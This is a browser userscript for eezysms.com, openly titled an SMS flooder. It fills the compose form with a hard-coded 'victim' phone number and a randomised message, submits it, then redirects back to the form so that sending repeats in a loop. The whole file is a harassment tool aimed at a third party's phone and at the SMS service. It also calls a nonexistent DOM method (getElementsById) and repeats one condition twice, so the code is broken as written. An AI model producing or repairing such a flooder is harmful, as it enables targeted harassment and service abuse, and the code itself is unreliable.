// ==UserScript==
// @name          Anonymous EEZYSMS.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*eezysms.com/*
// ==/UserScript==

var victim=2404816917; //Enter victims number here
var msg="1"; // EnterUr message here

if(document.location=="http://www.eezysms.com/veezy/index.php?action=composemysms"||document.location=="http://www.eezysms.com/veezy/index.php?action=composemysms")
{
document.getElementsById("sendto")[0].value=victim;
document.getElementsById("sms")[0].value=Math.floor(Math.random()*1456484)+"\n"+msg+Math.floor(Math.random()*1456484);
void(0);
document.forms[0].submit();
}

if(document.location=="http://www.eezysms.com/veezy/index.php?action=sendsms")
document.location="http://www.eezysms.com/veezy/index.php?action=composemysms"